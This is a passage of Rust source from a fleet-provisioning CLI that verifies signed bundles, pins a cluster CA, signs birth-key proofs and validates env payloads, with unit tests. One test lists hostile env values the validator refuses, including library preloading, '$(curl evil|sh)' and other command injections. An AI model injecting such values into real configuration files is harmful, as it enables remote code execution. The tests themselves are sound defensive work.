/// `env_quote` writes it. `noo-apply.sh`'s `env_payload_ok` is the Linux twin.
fn env_payload_ok(body: &str, kind: &str, keys: &[&str], inert: &[&str]) -> Result<(), String> {
    let refuse = |why: String| {
        Err(format!("REFUSED {kind} — {why} (65)"))
    };
    for (i, raw) in body.lines().enumerate() {
        let n = i + 1;
        let line = raw.trim_end_matches('\r');
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let Some((k, v)) = line.split_once('=') else {
            return refuse(format!("line {n} is not KEY=value"));
        };
        if !keys.contains(&k) && !inert.contains(&k) {
            return refuse(format!("line {n} sets '{k}', which is not a key {kind} is rendered with"));
        }
        if !shell_inert_value(v) {
            return refuse(format!("line {n} ({k}) is not a plain or quoted value — a command substitution or shell syntax"));
        }
        if k == "PATH" && v != AGENT_ENV_PATH {
            return refuse("PATH is not the rendered value".into());
        }
        if k == "DOCKER_HOST" && v != AGENT_ENV_DOCKER_HOST {
            return refuse("DOCKER_HOST is not the local socket".into());
        }
        if k == "NOO_APPLY_ACCEPT_CA_SIGNED" && v != "0" {
            return refuse("NOO_APPLY_ACCEPT_CA_SIGNED may only say 0".into());
        }
    }
    Ok(())
}

/// Is `v` pure data to a POSIX shell that sources `K=v`? Unquoted: plain
/// characters, and `$` only as `$HOME`. Single-quoted: anything but `'`.
/// Double-quoted: `$` only as `$HOME`, specials only backslash-escaped.
fn shell_inert_value(v: &str) -> bool {
    let b = v.as_bytes();
    let home = |i: usize| b[i..].starts_with(b"$HOME") && !b.get(i + 5).is_some_and(|c| c.is_ascii_alphanumeric() || *c == b'_');
    let mut i = 0;
    while i < b.len() {
        match b[i] {
            b'\'' => match b[i + 1..].iter().position(|c| *c == b'\'') {
                Some(end) => i += end + 2,
                None => return false,
            },
            b'"' => {
                i += 1;
                loop {
                    match b.get(i) {
                        None => return false,
                        Some(b'"') => { i += 1; break; }
                        Some(b'\\') if matches!(b.get(i + 1), Some(b'"' | b'\\' | b'`' | b'$')) => i += 2,
                        Some(b'$') if home(i) => i += 5,
                        Some(b'$' | b'`' | b'\\') => return false,
                        Some(_) => i += 1,
                    }
                }
            }
            b'$' if home(i) => i += 5,
            // env_quote's `'\''` — an escaped quote between two quoted runs.
            b'\\' if b.get(i + 1) == Some(&b'\'') => i += 2,
            c if c.is_ascii_alphanumeric() || b"_@%+=:,./-".contains(&c) => i += 1,
            _ => return false,
        }
    }
    true
}

const KNOWN_KINDS: &[&str] = &[
    "ca.crt", "node.crt", "node.key", "agent-env", "agent-unit", "agent-binary",
    "teardown", "applier", "hostd-binary", "restart-backends", "host-telemetry",
    "cli-binary", "cli-user", "agent-plist", "run-agent", "fetcher",
    "nats-creds", "fleet-secrets", "signing-pub",
    // The harness over the rail: the gateway binary, its env,
    // and its unit (Linux) or LaunchDaemon + runner (darwin).
    "harness-binary", "harness-env", "harness-unit", "harness-plist", "run-harness",
    // A node's backend door leaves, one pair per door
    // service — `node_leaves::NODE_DOOR_LEAVES`.
    "svc-vllm.crt", "svc-vllm.key", "svc-llamacpp.crt", "svc-llamacpp.key",
    "svc-ollama.crt", "svc-ollama.key", "svc-tei.crt", "svc-tei.key",
    "svc-reranker.crt", "svc-reranker.key",
];

/// The HTTPS agent for the poller: trusts ONLY the cluster CA pinned at
/// enroll. No anchor → no fetch. There is no escape hatch.
///
/// There used to be one: a `controller-insecure` marker (the Linux lane's
/// `/etc/noo/controller-insecure`) that turned every poll into an unverified
/// request. It recorded that FIRST CONTACT had nothing to verify against —
/// a window that closes the instant the anchor lands, which on an enrolled
/// node is always, because the anchor is what noo-apply verifies bundles
/// against. Nothing removed the marker, so the exception outlived its reason
/// indefinitely; a later fix made the anchor win over it, and this removes
/// it. An enrolled node has the CA; one that does not is not enrolled, and
/// polling unverified would not fix that.
/// A birth-key proof for the provisioning pull lane.
///
/// The Linux poller signs the same string in `scripts/noo-fetch.sh`; the
/// gateway verifies both against the certificate it recorded at enrollment
/// (`gateway-rust/src/birth_proof.rs`). Keeping the shell and this in step is
/// the point of `the_two_pollers_sign_the_same_string` below.
///
/// openssl rather than a Rust RSA crate on purpose: the birth key is already
/// generated with the openssl every enrolled host has (`enroll.rs` shells to
/// it for `req -x509`), `openssl dgst -sha256 -sign` is exactly PKCS#1 v1.5
/// over SHA-256, and adding an RSA implementation to the CLI to re-derive a
/// signature it can already produce would be a new dependency for no new
/// capability.
///
/// Returns the `X-Noo-Birth-Proof` header value, `<ts>.<base64 sig>`.
pub(crate) fn birth_proof_message(purpose: &str, node: &str, sha: &str, ts: i64) -> String {
    format!("noo-bundle-{purpose}:{node}:{sha}:{ts}")
}

/// Build the proof, or say exactly why it could not be built.
///
/// This returned `Option<String>` and threw openssl's stderr at `/dev/null`.
/// Both were wrong, and the cost was a live misdiagnosis (host6,
/// 2026-09-12): five distinct failures — no key, no openssl, a closed pipe, a
/// non-zero exit, an empty signature — all collapsed into `None`, the caller
/// posted the report unsigned anyway, and the only surviving evidence was the
/// gateway saying `Missing` about a header the node never sent. Nothing on
/// either side could tell "this Mac has no key" from "openssl refused this
/// key", because the one process that knew had its stderr discarded.
///
/// So: a `Result`, one named variant per step, and openssl's own words
/// carried out with it.
fn birth_proof(base: &Path, purpose: &str, node: &str, sha: &str) -> Result<String, String> {
    let key = base.join("birth.key");
    if !key.is_file() {
        return Err(format!(
            "no birth key at {} — this Mac is not armed for the pull lane; re-run `noo enroll`",
            key.display()
        ));
    }
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_err(|e| format!("this Mac's clock is before the epoch ({e})"))?
        .as_secs() as i64;
    let msg = birth_proof_message(purpose, node, sha, ts);

    // FILES, not pipes — and this is the fix, not a style choice.
    //
    // The first cut piped the message in on stdin and read the signature off
    // stdout. Two doors away in this same file, `darwin_apply` signs nothing
    // but DECRYPTS with the very same key, on the very same Mac, using
    // `-in <file>` and `-out <file>` — and that call has always worked. When
    // the pipe version failed on host6 (2026-09-12) while the file version
    // succeeded inches away, the piping was the only structural difference
    // left: same binary, same PATH, same key, same process, same user.
    //
    // macOS ships LibreSSL as /usr/bin/openssl, not the OpenSSL the Linux
    // poller uses, so "it works on Linux" is not evidence about this lane —
    // and the Linux test below passes against the broken signer, which is
    // exactly how this shipped. Handing LibreSSL a file to read and a file to
    // write removes binary-on-a-pipe from the picture entirely rather than
    // betting on how it behaves.
    // PER CALL, not per process. Keyed on the pid alone, two signings in one
    // process share one directory — and `cleanup` below removes it on EVERY
    // exit path, so whichever finishes first deletes the other's `sig` out
    // from under openssl. The poller signs twice (`fetch` at the top of this
    // file, `apply` below), and the test binary runs four signings across
    // parallel threads: that is where it first showed, as
    // `the_darwin_signer_produces_a_verifiable_signature` failing with
    // "Can't open .../sig for writing" once in four runs.
    static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let work = std::env::temp_dir().join(format!(
        "noo-birth-proof-{}-{}",
        std::process::id(),
        SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
    ));
    // Created afresh, 0700 (a pre-existing directory at this name is not
    // ours to sign in).
    if let Err(e) = {
        use std::os::unix::fs::DirBuilderExt;
        std::fs::DirBuilder::new().mode(0o700).create(&work)
    } {
        return Err(format!("could not make a signing work dir at {}: {e}", work.display()));
    }
    let msg_path = work.join("msg");
    let sig_path = work.join("sig");
    let cleanup = || {
        let _ = std::fs::remove_dir_all(&work);
    };
    if let Err(e) = std::fs::write(&msg_path, msg.as_bytes()) {
        cleanup();
        return Err(format!("could not stage the message to sign at {}: {e}", msg_path.display()));
    }
    // AS THE USER, wholly (H2 third review, L6): the key is the user's, and
    // a child forked while merely lowered would keep real uid 0.
    // stdout/stderr are captured, NOT null: this is the only thing that can
    // say WHY a signature was not produced; discarding it is why the live
    // failure could not be told apart from "this Mac has no key" without a
    // round trip.
    let out = lowered_output(
        Command::new(OPENSSL)
            .args(["dgst", "-sha256", "-sign"])
            .arg(&key)
            .arg("-out")
            .arg(&sig_path)
            .arg(&msg_path),
    );
    let out = match out {
        Ok(o) => o,
        Err(e) => {
            cleanup();
            return Err(format!("could not run openssl to sign with {}: {e}", key.display()));
        }
    };
    let err = String::from_utf8_lossy(&out.stderr).trim().to_string();
    if !out.status.success() {
        cleanup();
        return Err(format!(
            "`openssl dgst -sha256 -sign {}` failed ({}){}",
            key.display(),
            out.status,
            if err.is_empty() { " and said nothing".to_string() } else { format!(": {err}") }
        ));
    }
    let sig = match std::fs::read(&sig_path) {
        Ok(b) => b,
        Err(e) => {
            cleanup();
            return Err(format!(
                "openssl exited 0 but wrote no signature to {} ({e}){}",
                sig_path.display(),
                if err.is_empty() { String::new() } else { format!(": {err}") }
            ));
        }
    };
    cleanup();
    if sig.is_empty() {
        return Err(format!(
            "`openssl dgst -sha256 -sign {}` exited 0 and produced an EMPTY signature{}",
            key.display(),
            if err.is_empty() { String::new() } else { format!(": {err}") }
        ));
    }
    use base64::Engine as _;
    Ok(format!("{ts}.{}", base64::engine::general_purpose::STANDARD.encode(&sig)))
}

fn pinned_agent(base: &Path) -> Result<ureq::Agent, String> {
    let anchor = base.join("pki/ca.crt");
    let tls = {
        let pem = std::fs::read(&anchor).map_err(|_| format!(
            "no CA trust anchor at {}/pki/ca.crt — re-run `noo enroll` (this CLI pins every fetch to the cluster CA)",
            base.display()))?;
        let cert = ureq::tls::Certificate::from_pem(&pem)
            .map_err(|e| format!("pki/ca.crt is not a PEM certificate: {e}"))?;
        ureq::tls::TlsConfig::builder()
            .root_certs(ureq::tls::RootCerts::Specific(std::sync::Arc::new(vec![cert])))
            .build()
    };
    Ok(ureq::Agent::config_builder()
        .http_status_as_error(false)
        .timeout_global(Some(std::time::Duration::from_secs(60)))
        .tls_config(tls)
        .build()
        .into())
}


/// How long a signed bundle stays applicable. A CA signature never
/// expires, so without a clock it cannot distinguish "the controller is
/// pushing this now" from "someone kept a copy of last month's". Bundles
/// are applied within seconds of being built; a day is generous.
const BUNDLE_MAX_AGE_SECS: i64 = 86_400;

/// The v2 manifest header: who the bundle is for, and when it was signed.
///
/// Called only AFTER the signature verifies — an unsigned header is just
/// an attacker's opinion. See `security_local::manifest_header` for why
/// the binding exists and `noo-apply.sh` §1a for the shell twin.
fn verify_header(manifest: &str, node: &str) -> Result<(), String> {
    let field = |name: &str| -> Option<String> {
        manifest
            .lines()
            .find_map(|l| l.strip_prefix(name))
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
    };
    if field("#noo-bundle").is_none() {
        return Err("this bundle has no #noo-bundle header — it predates bundles being addressed to a node, \
                    so it could be replayed onto any node at any time. Re-push from a current controller (77)"
            .into());
    }
    match field("#node") {
        Some(addressed) if addressed == node => {}
        Some(addressed) => {
            return Err(format!(
                "this bundle is addressed to '{addressed}' but this node is '{node}' — applying it would \
                 install another node's identity here; refusing (77)"
            ))
        }
        None => return Err("bundle header names no node — refusing (77)".into()),
    }
    let Some(issued) = field("#issued").and_then(|v| v.parse::<i64>().ok()) else {
        return Err("bundle header carries no #issued stamp — refusing (77)".into());
    };
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    let age = now - issued;
    if age > BUNDLE_MAX_AGE_SECS {
        return Err(format!(
            "this bundle was signed {age}s ago, past the {BUNDLE_MAX_AGE_SECS}s freshness window — \
             refusing a replay. Re-push from the controller, or fix this node's clock (77)"
        ));
    }
    // Five minutes of skew, then it is a wrong clock rather than a bundle.
    if age < -300 {
        return Err(format!(
            "this bundle claims to be signed {}s in the future — this node's clock or the controller's \
             is wrong; refusing (77)",
            -age
        ));
    }
    Ok(())
}

/// noo-apply.sh §1-2 in Rust: signature, header, allowlist, per-file
/// sha256. On success `files/` holds exactly the manifested kinds (extras
/// are removed).
///
/// `node` is this box's own persisted identity (`~/noomesh/node-name`),
/// never anything read out of the bundle: in a re-targeting attack the
/// bundle carries the victim's identity files too, so a check against the
/// bundle's own contents would only agree with itself.
fn verify_bundle(stage: &Path, ca: &Path, node: &str) -> Result<(), String> {
    let manifest = stage.join("manifest");
    let sig = stage.join("manifest.sig");
    if !manifest.is_file() || !sig.is_file() {
        return Err("bundle lacks manifest/manifest.sig — refusing (65)".into());
    }
    if !ca.is_file() {
        return Err(format!("no CA trust anchor at {} — re-run `noo enroll` (77)", ca.display()));
    }
    // Derived OUTSIDE the stage: nothing the bundle carried can be this file.
    let keys = private_stage_dir("noo-verify-keys")?;
    let ca_pub = keys.join("ca.pub");
    let (c, o) = run(Command::new(OPENSSL).args(["x509", "-pubkey", "-noout", "-in", &ca.to_string_lossy()]));
    if c != 0 {
        let _ = std::fs::remove_dir_all(&keys);
        return Err(format!("could not read the CA public key: {o}"));
    }
    std::fs::write(&ca_pub, format!("{o}\n")).map_err(|e| format!("stage: {e}"))?;
    let r = verify_bundle_with(stage, ca, &ca_pub, node);
    let _ = std::fs::remove_dir_all(&keys);
    r
}

fn verify_bundle_with(stage: &Path, ca: &Path, ca_pub: &Path, node: &str) -> Result<(), String> {
    let manifest = stage.join("manifest");
    manifest_shape_ok(&std::fs::read(&manifest).map_err(|e| format!("manifest: {e}"))?)?;
    // The signing-key rule, noo-apply.sh §1 in Rust. Two arms:
    //   1. the fleet signing key this node already holds — the normal path;
    //   2. the CA, ONLY for a bundle carrying a signing-pub payload (the
    //      ROLLOVER), and only on first adoption (no signing.pub yet) or when
    //      the signing key this node holds countersigned it (`manifest.xsig*`).
    // The third arm — the CA unconditionally, behind
    // NOO_APPLY_ACCEPT_CA_SIGNED — is RETIRED: a CA-signed
    // bundle that is not a rollover is refused, whatever the variable says.
    let signing_pub = signing_pub_path(base_of(ca));
    // The kinds the SIGNED manifest names — never what is on disk.
    let kinds = manifest_kinds(&std::fs::read_to_string(&manifest).map_err(|e| format!("manifest: {e}"))?);
    let via = signature_lane(stage, &signing_pub, ca_pub, &kinds, &|pubkey, sigfile| {
        run(Command::new(OPENSSL).args([
            "dgst", "-sha256", "-verify", &pubkey.to_string_lossy(),
            "-signature", &sigfile.to_string_lossy(), &manifest.to_string_lossy(),
        ])).0 == 0
    })?;
    eprintln!("noo: bundle verified-by: {via}");
    record_verified(via, ca, &signing_pub);
    let text = std::fs::read_to_string(&manifest).map_err(|e| format!("manifest: {e}"))?;
    verify_header(&text, node)?;
    let mut named = std::collections::HashSet::new();
    for line in text.lines() {
        if line.starts_with('#') {
            continue; // header, consumed above
        }
        let mut it = line.split_whitespace();
        let (Some(sum), Some(kind)) = (it.next(), it.next()) else { continue };
        if !KNOWN_KINDS.contains(&kind) {
            // A kind this CLI does not know means the bundle is NEWER than
            // the binary reading it — and the bundle is carrying the newer
            // binary. Refusing here was a deadlock: host6 sat on
            // noo-cli-v0.5.35 from the day `harness-binary` was added
            // (2026-09-19), refusing on every tick the very bundle that
            // would have taught it the kind.
            //
            // The Linux applier has never had this problem: `noo-apply.sh`
            // installs a bundled `applier` and re-execs on the SAME bundle
            // before it validates anything (NOO_APPLY_REEXEC guards the
            // loop). This is that, for the Mac's Rust applier.
            //
            // Safe at this point and not before: the manifest's SIGNATURE
            // is already verified above, so the sha this checks against is
            // the controller's own. Same discipline as the Linux lane —
            // verify the payload against the signed manifest, install, then
            // re-run and let the NEW binary decide about the kinds.
            if let Some(rc) = self_update_and_reexec(&text, &stage.join("files"))? {
                return Err(rc);
            }
            return Err(format!("unknown kind '{kind}' — this CLI is older than the bundle; run `noo upgrade` (76)"));
        }
        let f = stage.join("files").join(kind);
        let bytes = std::fs::read(&f).map_err(|_| format!("manifest names '{kind}' but the bundle lacks it (65)"))?;
        let actual = {
            use sha2::{Digest, Sha256};
            hex::encode(Sha256::digest(&bytes))
        };
        if actual != sum {
            return Err(format!("sha256 mismatch for '{kind}' — refusing (74)"));
        }
        named.insert(kind.to_string());
    }
    if named.is_empty() {
        return Err("manifest names no files — refusing (65)".into());
    }
    // Anything unmanifested is unsigned: REFUSE the bundle (parity with
    // noo-apply.sh §2) rather than quietly dropping it.
    if let Ok(rd) = std::fs::read_dir(stage.join("files")) {
        for e in rd.flatten() {
            let name = e.file_name().to_string_lossy().to_string();
            if !named.contains(&name) {
                return Err(format!(
                    "REFUSED — the bundle carries files/{name}, which the signed manifest does not name (65)"
                ));
            }
        }
    }
    // No CR, no NUL in a text kind (parity with noo-apply.sh): a line hidden
    // behind either reaches whatever parses the file.
    for kind in TEXT_KINDS {
        if let Ok(b) = std::fs::read(stage.join("files").join(kind)) {
            if b.contains(&b'\r') || b.contains(&0) {
                return Err(format!("REFUSED {kind} — carries a carriage return or NUL byte (65)"));
            }
        }
    }
    // The downgrade floor: a CLI is this node's applier, so an older one
    // would re-open the lanes this one retired.
    if let Ok(cli) = std::fs::read(stage.join("files").join("cli-binary")) {
        let got = apply_generation_of(&cli);
        if got < APPLY_GENERATION {
            return Err(format!(
                "REFUSED — the bundle's CLI is applier generation {got}, older than this one \
                 ({APPLY_GENERATION}); installing it would re-open retired lanes (65)"
            ));
        }
    }
    Ok(())
}

/// `<base>/pki/signing.pub` from the `<base>/pki/ca.crt` the verifier was
/// handed — the two anchors live side by side, exactly as `$PKI/ca.crt` and
/// `$PKI/signing.pub` do on a Linux node.
fn signing_pub_path(pki: &Path) -> PathBuf {
    pki.join("signing.pub")
}

/// The directory the anchor lives in. `verify_bundle` takes the ca.crt path
/// rather than the base dir (it predates the signing key), and changing that
/// signature would touch every caller for no gain.
fn base_of(ca: &Path) -> &Path {
    ca.parent().unwrap_or(Path::new("."))
}

/// The lane a verified bundle came in on (`noo-apply.sh`'s
/// `bundle_signature_lane`, in Rust), or the refusal. `verify(pubkey, sig)`
/// checks `manifest` against one signature file, so the decision is testable
/// without the filesystem layout of a real node.
///
/// `NOO_APPLY_ACCEPT_CA_SIGNED` is no longer consulted: the CA-signed
/// compatibility arm it opened is retired. A value in the
/// environment is named as ignored so nobody believes it still does anything.
fn signature_lane(
    stage: &Path,
    signing_pub: &Path,
    ca_pub: &Path,
    kinds: &[String],
    verify: &dyn Fn(&Path, &Path) -> bool,
) -> Result<&'static str, String> {
    // A rollover is a bundle whose signed manifest names `signing-pub` and
    // NOTHING else: the CA delivers a public key, never code.
    let rollover = kinds.len() == 1 && kinds[0] == "signing-pub";
    let carries_key = kinds.iter().any(|k| k == "signing-pub");
    if std::env::var("NOO_APPLY_ACCEPT_CA_SIGNED").is_ok_and(|v| !v.is_empty()) {
        eprintln!(
            "noo: NOO_APPLY_ACCEPT_CA_SIGNED is retired and ignored — \
             the CA-signed lane no longer exists"
        );
    }
    let sig = stage.join("manifest.sig");
    let has_signing = signing_pub.is_file();
    if has_signing && verify(signing_pub, &sig) {
        return Ok("signing-key");
    }
    let ca_ok = verify(ca_pub, &sig);
    if rollover && ca_ok {
        if !has_signing {
            return Ok("ca-rollover");
        }
        if countersignatures(stage).iter().any(|x| verify(signing_pub, x)) {
            return Ok("ca-rollover-countersigned");
        }
        return Err(format!(
            "REFUSED — a CA-signed signing-key rollover that the signing key this node already \
             holds ({}) did not countersign. The CA key alone may not replace an adopted signing \
             key: re-run `noo security pki rotate-signing-key` from a controller \
             that still holds the previous signing key, or re-enroll this node (77)",
            signing_pub.display()
        ));
    }
    if ca_ok && carries_key {
        return Err(format!(
            "REFUSED — a CA-signed bundle may carry signing-pub and NOTHING else (it carries: {}). \
             The CA key delivers a public key, never code (77)",
            kinds.join(" ")
        ));
    }
    if ca_ok {
        return Err(
            "REFUSED — this bundle is signed by the cluster CA, not the fleet signing key, and it \
             is not a signing-key rollover. The CA-signed apply lane is retired: \
             on the controller run `noo security pki rotate-signing-key --deliver-only`, then \
             `noo cluster provision <node> --wait` (77)"
                .into(),
        );
    }
    if has_signing {
        return Err(format!(
            "manifest signature verifies against NEITHER the fleet signing key ({}) nor the \
             pinned cluster CA — refusing (77)",
            signing_pub.display()
        ));
    }
    Err("manifest signature does NOT verify against the pinned cluster CA — refusing (77)".into())
}

/// `manifest.xsig*` in the staged bundle, sorted: the countersignatures the
/// controller wrote with each signing key it still holds (current first).
fn countersignatures(stage: &Path) -> Vec<PathBuf> {
    let mut out: Vec<PathBuf> = std::fs::read_dir(stage)
        .map(|rd| {
            rd.flatten()
                .filter(|e| e.file_name().to_string_lossy().starts_with("manifest.xsig"))
                .map(|e| e.path())
                .filter(|p| p.is_file())
                .collect()
        })
        .unwrap_or_default();
    out.sort();
    out
}

/// sha256 hex of a PEM certificate's DER form — the enroll blob's `ca` pin
/// and prep-host's `openssl x509 -outform DER | sha256sum` agree on this.
pub(crate) fn cert_der_sha256(pem: &[u8]) -> Result<String, String> {
    let text = std::str::from_utf8(pem).map_err(|_| "CA PEM is not UTF-8".to_string())?;
    let body: String = text.lines()
        .skip_while(|l| !l.starts_with("-----BEGIN CERTIFICATE-----")).skip(1)
        .take_while(|l| !l.starts_with("-----END CERTIFICATE-----"))
        .collect();
    use base64::Engine as _;
    let der = base64::engine::general_purpose::STANDARD.decode(body.trim())
        .map_err(|e| format!("CA PEM body is not base64: {e}"))?;
    use sha2::{Digest, Sha256};
    Ok(hex::encode(Sha256::digest(&der)))
}

#[cfg(test)]
mod reexec_bundle_tests {
    use super::{leave_reexec_bundle, reexec_bundle_path, take_reexec_bundle};

    /// `<fresh dir>/state`: like ROOT_STATE_DIR, a directory whose parent
    /// is not the shared temp dir, so a run as root passes the parent check.
    fn tmp() -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!("noo-reexec-{}-{}", std::process::id(), std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::create_dir_all(&d).unwrap();
        d.join("state")
    }

    #[test]
    fn the_reexec_pass_applies_the_bundle_it_was_handed_and_consumes_it() {
        let base = tmp();
        leave_reexec_bundle(&base, b"ciphertext").unwrap();
        assert_eq!(take_reexec_bundle(&base, true).as_deref(), Some(&b"ciphertext"[..]));
        assert!(!reexec_bundle_path(&base).exists(), "consumed on take");
        assert_eq!(take_reexec_bundle(&base, true), None, "nothing to take twice");
    }

    #[test]
    fn an_ordinary_tick_never_applies_a_leftover_and_clears_it() {
        let base = tmp();
        leave_reexec_bundle(&base, b"ciphertext").unwrap();
        assert_eq!(take_reexec_bundle(&base, false), None);
        assert!(!reexec_bundle_path(&base).exists(), "a stale hand-over is cleared, not kept for later");
    }
}

#[cfg(test)]
mod stale_user_harness_tests {
    use super::stale_user_harness;

    #[test]
    fn the_gui_domain_target_names_the_uid_and_the_label() {
        let (target, plist) = stale_user_harness("someone", "503");
        assert_eq!(target, "gui/503/net.noomesh.harness");
        assert_eq!(plist, "/Users/someone/Library/LaunchAgents/net.noomesh.harness.plist");
        // `bootout` takes a domain target, never a plist path.
        assert!(!target.ends_with(".plist") && !target.starts_with('/'), "{target}");
    }
}

#[cfg(test)]
mod env_shape_tests {
    use super::{env_payload_ok, shell_inert_value, AGENT_ENV_INERT_KEYS, AGENT_ENV_KEYS, HARNESS_ENV_KEYS};

    fn render(tmpl: &str) -> String {
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
        let text = std::fs::read_to_string(root.join(tmpl)).unwrap();
        let mut out = String::new();
        let mut rest = text.as_str();
        // Strip {# #} and {% %}, replace {{ }} with a plain value.
        while let Some(at) = rest.find('{') {
            out.push_str(&rest[..at]);
            let tail = &rest[at..];
            let close = match &tail[..2.min(tail.len())] {
                "{#" => "#}",
                "{%" => "%}",
                "{{" => "}}",
                _ => { out.push('{'); rest = &tail[1..]; continue; }
            };
            let end = tail.find(close).expect("unclosed tag") + 2;
            if close == "}}" {
                out.push_str("value");
            }
            rest = &tail[end..];
        }
        out.push_str(rest);
        out
    }

    /// The floor: what the controller renders passes, Mac-quoted roots too.
    #[test]
    fn the_rendered_templates_pass() {
        let agent = render("node-agent-go/deploy/noo-node-agent.env.tmpl");
        env_payload_ok(&agent, "agent-env", AGENT_ENV_KEYS, AGENT_ENV_INERT_KEYS).unwrap();
        let harness = render("node-agent-go/deploy/noo-harness.env.tmpl");
        env_payload_ok(&harness, "harness-env", HARNESS_ENV_KEYS, &[]).unwrap();
        let mac = format!(
            "{agent}NOO_PKI_DIR=$HOME/noomesh/pki\nMODELS_DIR=\"$HOME/My Models\"\nHF_CACHE_DIR='/Volumes/ext ssd/hf'\n"
        );
        env_payload_ok(&mac, "agent-env", AGENT_ENV_KEYS, AGENT_ENV_INERT_KEYS).unwrap();
        for v in [
            super::super::env_quote::env_quote("/Volumes/My Drive/models"),
            super::super::env_quote::env_quote("$HOME/a b/c\"d"),
            super::super::env_quote::env_quote("it's"),
        ] {
            assert!(shell_inert_value(&v), "env_quote output refused: {v}");
        }
    }

    /// The refusals — each was accepted before an earlier release.
    #[test]
    fn an_env_line_outside_the_shape_is_refused() {
        let agent = render("node-agent-go/deploy/noo-node-agent.env.tmpl");
        for line in [
            "LD_PRELOAD=/tmp/evil.so",
            "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib",
            "PATH=/tmp/evil:/usr/bin",
            "DOCKER_HOST=tcp://10.0.0.1:2375",
            "LOG_LEVEL=$(curl evil|sh)",
            "LOG_LEVEL=`id`",
            "LOG_LEVEL=info;id",
            "MODELS_DIR=\"$(id)\"",
            "MODELS_DIR=${IFS}x",
            "words without an equals",
        ] {
            let body = format!("{agent}{line}\n");
            let e = env_payload_ok(&body, "agent-env", AGENT_ENV_KEYS, AGENT_ENV_INERT_KEYS)
                .expect_err(line);
            assert!(e.contains("REFUSED agent-env") && e.contains("(65)"), "{e}");
        }
        let harness = render("node-agent-go/deploy/noo-harness.env.tmpl");
        assert!(env_payload_ok(&format!("{harness}DOCKER_HOST=unix:///var/run/docker.sock\n"),
            "harness-env", HARNESS_ENV_KEYS, &[]).is_err());
    }
}

#[cfg(test)]
mod nats_creds_merge_tests {
    use super::merge_nats_creds;

    #[test]
    fn merge_replaces_the_pair_and_keeps_the_rest() {
        let dir = std::env::temp_dir().join(format!("noo-natscreds-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let env = dir.join("agent.env");
        std::fs::write(&env, "NODE_ID=host6\nNATS_USER=noo\nNATS_NODE_USER=stale\nNATS_NODE_PASSWORD=old\nOLLAMA_URL=http://127.0.0.1:11434\n").unwrap();
        merge_nats_creds("NODE=host6\nNATS_NODE_USER=node-host6\nNATS_NODE_PASSWORD=s3cret\nIGNORED=x\n", &env, "host6").unwrap();
        let got = std::fs::read_to_string(&env).unwrap();
        assert!(got.contains("NODE_ID=host6\n"), "{got}");
        // A stale retired line is left alone (it is inert — the agent never
        // presents it): this merge touches only the node's own pair.
        assert!(got.contains("NATS_USER=noo\n"), "unrelated lines are kept byte-for-byte: {got}");
        assert!(got.contains("NATS_NODE_USER=node-host6\n") && got.contains("NATS_NODE_PASSWORD=s3cret\n"), "{got}");
        assert!(!got.contains("stale") && !got.contains("IGNORED"), "{got}");
        assert!(merge_nats_creds("NODE=host6\nNATS_NODE_USER=only\n", &env, "host6").is_err(), "half a pair is refused");
        assert!(merge_nats_creds("NATS_NODE_USER=u\nNATS_NODE_PASSWORD=p\n", &env, "host6").is_err(), "an unbound pair is refused");
        assert!(merge_nats_creds("NODE=host3\nNATS_NODE_USER=u\nNATS_NODE_PASSWORD=p\n", &env, "host6").is_err(), "another node's pair is refused");
        let _ = std::fs::remove_dir_all(&dir);
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn data_root_from_env_reads_either_key_and_ignores_blanks() {
        let d = std::env::temp_dir().join(format!("noo-dre-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&d);
        let f = d.join("agent.env");
        std::fs::write(&f, "NOO_NODE_ID=host6\nNOO_DATA_ROOT=\nPAI_DATA_ROOT=\"/Volumes/Data/noo\"\n").unwrap();
        assert_eq!(super::data_root_from_env(&f).as_deref(), Some("/Volumes/Data/noo"));
        std::fs::write(&f, "NOO_DATA_ROOT=/Users/x/noo-data\n").unwrap();
        assert_eq!(super::data_root_from_env(&f).as_deref(), Some("/Users/x/noo-data"));
        assert_eq!(super::data_root_from_env(&d.join("missing")), None);
        let _ = std::fs::remove_dir_all(&d);
    }

    use super::*;

    // ── bundle header (v2): who it is for, and when it was signed ──────

    fn manifest(node: &str, age_secs: i64) -> String {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64;
        format!(
            "#noo-bundle 2\n#node {node}\n#issued {}\ndeadbeef  ca.crt\n",
            now - age_secs
        )
    }

    #[test]
    fn a_bundle_addressed_here_and_fresh_passes() {
        assert!(verify_header(&manifest("host3", 5), "host3").is_ok());
    }

    #[test]
    fn a_bundle_for_another_node_is_refused() {
        // The attack: a cert bundle carries that node's own node.key.
        // Applied here, it would hand this box another node's identity —
        // and identity is what decides who may command a box.
        let e = verify_header(&manifest("host3", 5), "host8").unwrap_err();
        assert!(e.contains("addressed to 'host3'"), "{e}");
    }

    #[test]
    fn a_stale_bundle_is_refused() {
        let e = verify_header(&manifest("host3", BUNDLE_MAX_AGE_SECS + 60), "host3").unwrap_err();
        assert!(e.contains("freshness window"), "{e}");
    }

    #[test]
    fn a_bundle_from_the_future_is_a_clock_problem() {
        let e = verify_header(&manifest("host3", -3600), "host3").unwrap_err();
        assert!(e.contains("clock"), "{e}");
    }

    #[test]
    fn small_skew_is_tolerated() {
        assert!(verify_header(&manifest("host3", -60), "host3").is_ok());
    }

    #[test]
    fn a_v1_manifest_is_refused_rather_than_waved_through() {
        // The whole point: an unaddressed bundle must not be accepted just
        // because its signature is good. A signature says who built it,
        // never who it was for or when.
        let e = verify_header("deadbeef  ca.crt\n", "host3").unwrap_err();
        assert!(e.contains("#noo-bundle"), "{e}");
    }

    #[test]
    fn a_header_without_a_stamp_is_refused() {
